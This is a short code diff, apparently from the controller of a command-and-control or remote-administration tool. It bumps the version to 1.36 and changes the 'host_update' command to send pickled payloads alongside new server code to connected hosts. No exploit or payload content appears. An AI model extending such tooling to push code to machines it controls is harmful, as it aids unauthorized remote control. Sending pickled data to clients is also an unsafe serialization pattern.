@@ -144,7 +144,7 @@ def main():
     ctrlC = False
     active=False
     first_run = True
-    cc_version = '1.35'
+    cc_version = '1.36'
     logpath = 'Logs/'
     helperpath = os.getcwd() + '/'
     client_log_path = ''
@@ -674,7 +674,7 @@ def main():
                                     new_server = content.read()
                                 with open('Payloads/payloads.txt', 'rb') as content:
                                     payloads = content.read() #read payloads
-                                nextcmd = "host_update%s" % pickle.dumps(new_server)
+                                nextcmd = "host_update%s" % pickle.dumps((payloads, new_server))
                             else:
                                 print '%sCancelling update' % redX
                                 nextcmd = ''
